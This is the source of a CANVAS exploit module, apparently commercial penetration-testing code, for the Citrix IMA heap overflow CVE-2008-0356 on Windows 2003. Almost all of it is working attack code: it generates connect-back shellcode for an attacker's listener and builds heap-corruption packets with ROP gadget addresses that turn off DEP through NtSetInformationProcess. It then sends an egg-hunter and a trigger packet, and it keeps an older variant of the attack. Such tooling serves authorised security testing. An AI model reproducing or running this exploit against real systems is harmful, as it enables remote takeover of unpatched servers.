#! /usr/bin/env python



#
# CANVAS Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http:#www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path:
    sys.path.append(".")


import os,getopt
import socket
import struct
from exploitutils import *
from encoder import addencoder
from shellcode import shellcodeGenerator, win32shell
from tcpexploit import tcpexploit
import canvasengine
import time
from MOSDEF import mosdef

NAME="Citrix IMA Heap Overflow Demo"
DESCRIPTION="Citrix IMA Heap Overflow Demo"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Citrix"
DOCUMENTATION["Repeatability"]="This is a one shot exploit."
DOCUMENTATION['CVE Name']   = "CVE-2008-0356"
DOCUMENTATION['CVE Url']    = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0356"
DOCUMENTATION['CVSS'] = 10.0
VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003" ]

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.port=2512
        self.host="192.168.1.200"
        #self.shellcode="\xcc"
        self.badstring=""
        self.setVersions()
        self.version=1
        self.done=0
        self.name=NAME
        self.searchcode = ""
        self.PTR = 0x41bd1C  - 0x40 
        
        return


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Windows 2003" ,0x74fd2d57,24,0x77520000,220)


    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        localhost = self.callback.ip
        localport = self.callback.port
        sc = shellcodeGenerator.win32()
        sc.addAttr('SearchCodeSafeSEH',{'tag':0x46494a45}) #'c00k'
        sc.standalone = 1
        self.searchcode = sc.get()        
        open("searchcode.s", "w").write( sc.code )
        
        #sc = shellcodeGenerator.win32()
        #sc.addAttr("OrigamiInjectSmall", { "ipaddress": localhost, "port": localport, "processname": "CdfSvc.exe"})
        #sc.addAttr("ExitThread", None)        
        #self.callback.argsDict["fromcreatethread"] = 1
        self.shellcode = sc.get()
        open("shellcode.s", "w").write( sc.code )
        import shellcode.standalone.windows.payloads as payloads
        p = payloads.payloads()
        sc = p.forkload( localhost, localport, restorehash=True, load_winsock=True,  processname = "dmremote" )
        self.shellcode = p.assemble(sc)

        #self.createWin32Shellcode(self.badstring,localhost,localport)
        #self.createHeapSafeInjectIntoProcess(self.badstring, localhost, localport, smallcode=1, processname="CdfSvc.exe", backupprocess="cdfsvc.exe")

        # Fixup Code:
        code = "movl $0x%08x, %%eax\nmov %%eax, (0x%08x) " % ( (self.PTR + 0x2C), (self.PTR + 0x2C) )
        fixup_code = mosdef.assemble(code, "X86")
        self.shellcode = struct.pack("<L", 0x46494a45) * 2  + fixup_code + self.shellcode 
        
        return self.shellcode



    def test(self):
        """

        """
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("No connection could be established (%s:%d)"%(self.host,self.port))
            return 0
        return 1

    def run(self):
        self.host=self.target.interface
        #self.host="192.168.1.200"
        self.port=int(self.argsDict.get("port",self.port))

        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

    #  if self.version==0:
            #self.log("Automatic versioning not enabled.")
            #self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            #return 0

        self.log("Attacking %s:%d"%(self.host,self.port))
        self.log('Length of shellcode=%s'%(len(self.shellcode)))
        self.attack()
        ret=self.ISucceeded()
        if ret:
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
        else:
            self.setInfo("%s attacking %s:%d - done (failed?!)"%(NAME,self.host,self.port))
        return ret

    def attack(self):
        tsize = 0x100
        #PTR = 0x41b694-0x40-0x24-8        
        PTR  =  self.PTR #0x7C9020E8

        
        buf = "A"*0x050  + self.shellcode + "A" * 0x100
        
        buf = struct.pack("<L", len(buf)) + buf
        self.log("Sending a Chunk in Memory for our shellcode")
        
        self.SendPacket(self.host,buf)

        self.log("Preparing Exploit Buffer")
        self.log("Using Size: %d"%tsize)
        buf = ""
        buf+="\xEF" #This is chunk 7
        buf+="\xff";
        buf+="\xff";
        buf+="\xff";
        
        buf += struct.pack("<LL", 0x80808080, PTR) * 21
        self.SendPacket(self.host,buf)
        
        buf = ""
        buf+="\xEF" #This is chunk 7
        buf+="\xff";
        buf+="\xff";
        buf+="\xff";
     
        # The function pointer is a call [esi]
        # keep in mind we are overwriting a pointer which is used, but we
        # make it point to something writeable (is not on our buffer, is just some pointer
        # that is copied on the memmove and that we dont control, but we know is writeable)
        buf+=struct.pack("<L", PTR - 0x20)  # TRASH
        buf+=struct.pack("<L", 0x7C9020E8)  # 1st ADDY
        #7C9020E8   87E6             XCHG ESI,ESP
        #7C9020EA   48               DEC EAX
        #7C9020EB   0000             ADD BYTE PTR DS:[EAX],AL
        #7C9020ED   5F               POP EDI
        #7C9020EE   5E               POP ESI
        #7C9020EF   5B               POP EBX
        #7C9020F0   5D               POP EBP
        #7C9020F1   C2 1400          RETN 14
        buf+=struct.pack("<L", PTR - 0x40)     # ESI
        buf+=struct.pack("<L", 0x22222222)     # EBX
        buf+=struct.pack("<L", PTR + 0x68)     # EBP points to the PTR+0xE0
        buf+=struct.pack("<L", 0x7c83e413)     # 2nd addy: NtSetInformationProcess
        buf+=struct.pack("<L", 0x55555555)     # TRASH
        buf+=struct.pack("<L", 0x66666666)     # TRASH
        buf+=struct.pack("<L", 0x77777777)     # TRASH
        buf+=struct.pack("<L", 0x88888888)     # TRASH

        buf+=struct.pack("<L", PTR) # another pointer we fix
        buf+=struct.pack("<L", PTR + 0xE0) # Our shellcode
        
        buf+="\x80"* 71
        buf+=struct.pack("<L",PTR)
        buf+="\x90"*(44)

        #First packet 
        # EF

        PTR = 0x01431D0
        #buf2 = "\xEF\xFF\xFF\xFF" + struct.pack("<LL", PTR, 0x0) *41
        self.SendPacket(self.host,buf)

        time.sleep(1)

        buf="\xF7"+buf[1:] # This is chunk 8
        self.SendPacket(self.host,buf)
        time.sleep(1)
        # Search shellcode
        buf+="\x41"        
        buf+=self.searchcode
        self.SendPacket(self.host,buf)  # send the shellcode
        #time.sleep(2)
        # triggering packet
        buf="\x20\x00\x00\x00"+"A" * 0x20
        self.SendPacket(self.host,buf)  # send the shellcode
        time.sleep(2)
        return 

    def attack_old(self):
        tsize = 0x100

        buf = "A"*0x050 + self.shellcode + "A" * 0x400
        
        buf = struct.pack("<L", len(buf)) + buf
        self.log("Sending a Chunk in Memory for our shellcode")
        
        self.SendPacket(self.host,buf)

        self.log("Preparing Exploit Buffer")
        self.log("Using Size: %d"%tsize)
        buf = ""
        buf+="\xEF" #This is chunk 7
        buf+="\xff";
        buf+="\xff";
        buf+="\xff";
        PTR = 0x41b694-0x40-0x24-8

        buf+=struct.pack("<L",0x41424344)	 # TRASH
        buf+=struct.pack("<L",0x42424444)	 # TRASH
        buf+=struct.pack("<L", PTR + 0x54)	 # EBP (would point back to 3rd addy
        buf+=struct.pack("<L",0x7c83e413)	 # 2nd addy: NtSetInformationProcess
        buf+=struct.pack("<L",0x33333333)	 # TRASH
        buf+=struct.pack("<L",0x44444444)	 # TRASH
        buf+=struct.pack("<L", PTR + 0x5C + 0x8C) # 3rd addy: search shellcode
        buf+=struct.pack("<L",0x66666666)	 # TRASH
        buf+=struct.pack("<L",0x77777777)	 # TRASH
        buf+=struct.pack("<L",0x88888888)	 # TRASH

        buf+=struct.pack("<L",PTR)
        buf+=struct.pack("<L", 0x7CA37579) # 1st addy : XCHG ESP, ECX / POP EBP & RETN8
        
        buf+="\x80"* 71
        buf+=struct.pack("<L",PTR)
        buf+="\x90"*(44)

        #First packet 
        # EF
        buf="\xEF"+buf[1:] # This is chunk 7

        PTR = 0x01431D0
        #buf2 = "\xEF\xFF\xFF\xFF" + struct.pack("<LL", PTR, 0x0) *41
        self.SendPacket(self.host,buf)

        time.sleep(1)

        buf="\xF7"+buf[1:] # This is chunk 8
        self.SendPacket(self.host,buf)
        time.sleep(1)
        # Search shellcode
        buf+="\x41"        
        buf+=self.searchcode
        self.SendPacket(self.host,buf)	# send the shellcode
        time.sleep(2)

    def SendPacket(self, targetip, buf):
        try:
            targetip = socket.gethostbyname(targetip)
        except:
            return False

        ret = True
        s=self.gettcpsock()

        #try to connect 10 times (we might change this in the release version?)
        try:
            s.connect((targetip, self.port))
        except:
            self.log("Error:  connect() failed.")
            self.log("Waiting...")
            retry = 0
            while retry < 10:
                retry+=1
                try:
                    time.sleep(0.1) #small delay
                    self.log(".%d,"%len(buf))  #debug?
                    s.connect((targetip, self.port))
                except:
                    continue
                break

        self.log("Receiving....")
        try:
            buf2=s.recv(len(buf))
            self.log("%s"%buf2) #DEBUG
        except:
            self.log("Error:  recv() failed.")

        self.log("Sending Exploit....(0x%08x)" % len(buf))
        try:
            s.sendall(buf)
        except:
            self.log("Error:  sendto() failed.")
            ret = False
        s.close()

        return ret

    def shutdown(self):
        self.done=1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
